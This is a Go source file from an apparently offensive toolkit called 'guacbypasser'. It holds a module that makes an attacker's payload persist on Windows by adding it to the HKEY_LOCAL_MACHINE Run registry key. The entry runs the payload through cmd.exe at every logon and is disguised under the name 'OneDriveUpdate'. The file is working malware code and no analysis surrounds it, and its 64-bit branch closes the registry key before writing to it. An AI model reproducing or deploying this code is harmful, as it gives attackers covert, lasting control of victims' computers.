package guacbypasser

import (
	"fmt"
	"path/filepath"
	"runtime"

	"golang.org/x/sys/windows/registry"
)

func pHklm(path string) error {
	_ = Reporter{
		Name: "hklmruner",
		Desc: "Gain persistence using HKEY_LOCAL_MACHINE Run registry key",
		Id:   5,

		Type:   "Persistence",
		Module: "pHklm",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)

	if runtime.GOARCH == "386" {
		wk32WOW64, err := registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
		)
		defer wk32WOW64.Close()
		if err != nil {
			return err
		}
		if err := wk32WOW64.SetStringValue("OneDriveUpdate", cmdN); err != nil {
			return err
		}
	} else {
		wk32MICROSOFT, err := registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
		)
		wk32MICROSOFT.Close()
		if err != nil {
			return err
		}
		if err := wk32MICROSOFT.SetStringValue("OneDriveUpdate", cmdN); err != nil {
			return err
		}
	}
	return nil
}
